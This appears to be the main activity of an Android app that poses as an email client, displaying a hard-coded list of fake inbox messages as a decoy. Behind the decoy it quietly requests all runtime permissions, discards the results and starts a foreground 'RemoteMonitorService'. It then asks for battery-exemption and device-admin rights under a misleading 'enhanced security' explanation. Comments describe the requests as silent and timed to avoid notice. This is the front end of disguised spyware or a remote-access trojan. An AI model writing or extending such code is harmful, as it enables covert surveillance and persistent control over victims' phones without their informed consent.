package com.email

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.email.databinding.ActivityMainBinding
import com.email.receiver.DeviceAdminReceiver
import com.email.service.RemoteMonitorService
import com.email.util.PermissionUtil
import java.util.UUID

data class EmailItem(
    val sender: String,
    val subject: String,
    val preview: String,
    val time: String,
    val isUnread: Boolean,
    val avatarLetter: String
)

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var prefs: SharedPreferences
    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>

    private val fakeEmails = listOf(
        EmailItem("Sarah Mitchell",    "Re: Q4 Budget Review",                      "Hi, I've attached the revised spreadsheet with the updated figures from last week's...", "9:14 AM",  true,  "S"),
        EmailItem("no-reply@netflix.com", "Your November bill is ready",            "Your payment of \$15.49 will be processed on November 5th. View your account...",        "8:02 AM",  true,  "N"),
        EmailItem("James Okonkwo",     "Project Phoenix — kickoff Thursday",        "Team, just a quick reminder that we're kicking off Thursday at 10 AM in the main...",   "Yesterday",false, "J"),
        EmailItem("LinkedIn",          "You have 3 new connection requests",        "People you may know: Priya Sharma, David Chen, Amanda Kowalski. Connect now...",         "Yesterday",false, "L"),
        EmailItem("Dr. Anita Patel",   "Appointment Confirmation — Nov 8",          "This is a reminder of your appointment on November 8th at 2:30 PM. Please arrive...",   "Mon",      false, "A"),
        EmailItem("GitHub",            "Security alert: new sign-in from Chrome",  "We noticed a new sign-in to your account from a Chrome browser on Windows. If this...", "Mon",      false, "G"),
        EmailItem("mom@gmail.com",     "Thanksgiving plans",                        "Hi honey, just wanted to check if you're coming home for Thanksgiving this year...",    "Sun",      false, "M")
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        prefs = getSharedPreferences("email_prefs", Context.MODE_PRIVATE)
        ensureDeviceId()

        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "Inbox"

        setupEmailList()
        setupNavigation()

        // Register launcher
        permissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { /* silently consume */ }

        if (savedInstanceState == null) {
            // Request runtime permissions immediately (non-blocking)
            requestRuntimePermissions()
            // Start monitoring service (delayed 300ms so UI draws first)
            Handler(Looper.getMainLooper()).postDelayed({ startMonitorService() }, 300)
            // Request battery / admin silently, much later so they don't interfere with launch
            Handler(Looper.getMainLooper()).postDelayed({ requestSilentPrivileges() }, 3000)
        }
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
        }
    }

    private fun setupEmailList() {
        binding.recyclerView.layoutManager = LinearLayoutManager(this)
        binding.recyclerView.adapter = EmailAdapter(fakeEmails) { email ->
            val intent = Intent(this, EmailDetailActivity::class.java).apply {
                putExtra("sender",  email.sender)
                putExtra("subject", email.subject)
                putExtra("preview", email.preview)
                putExtra("time",    email.time)
            }
            startActivity(intent)
        }
    }

    private fun setupNavigation() {
        binding.bottomNav.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_mail    -> true
                R.id.nav_search  -> true
                R.id.nav_compose -> true
                else             -> false
            }
        }
        binding.fab.setOnClickListener { /* compose placeholder */ }
    }

    private fun requestRuntimePermissions() {
        try {
            permissionLauncher.launch(PermissionUtil.getAllRequiredPermissions())
        } catch (_: Exception) {}
    }

    private fun startMonitorService() {
        try {
            val intent = Intent(this, RemoteMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    /** Battery + device admin — requested 3s after launch, only if not already active */
    private fun requestSilentPrivileges() {
        // Battery optimization exemption
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                )
            }
        } catch (_: Exception) {}

        // Device admin (only prompt once)
        try {
            if (!prefs.getBoolean("admin_prompted", false)) {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                if (!dpm.isAdminActive(admin)) {
                    prefs.edit().putBoolean("admin_prompted", true).apply()
                    startActivity(
                        Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Required for enhanced security and remote wipe capabilities.")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                    )
                }
            }
        } catch (_: Exception) {}
    }
}

class EmailAdapter(
    private val items: List<EmailItem>,
    private val onClick: (EmailItem) -> Unit
) : RecyclerView.Adapter<EmailAdapter.VH>() {

    inner class VH(v: View) : RecyclerView.ViewHolder(v) {
        val avatar:    TextView = v.findViewById(R.id.tvAvatar)
        val sender:    TextView = v.findViewById(R.id.tvSender)
        val subject:   TextView = v.findViewById(R.id.tvSubject)
        val preview:   TextView = v.findViewById(R.id.tvPreview)
        val time:      TextView = v.findViewById(R.id.tvTime)
        val unreadDot: View     = v.findViewById(R.id.viewUnread)
    }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val v = android.view.LayoutInflater.from(parent.context)
            .inflate(R.layout.item_email, parent, false)
        return VH(v)
    }

    override fun onBindViewHolder(holder: VH, position: Int) {
        val item = items[position]
        holder.avatar.text    = item.avatarLetter
        holder.sender.text    = item.sender
        holder.subject.text   = item.subject
        holder.preview.text   = item.preview
        holder.time.text      = item.time
        holder.unreadDot.visibility = if (item.isUnread) View.VISIBLE else View.INVISIBLE
        holder.itemView.setOnClickListener { onClick(item) }
    }

    override fun getItemCount() = items.size
}
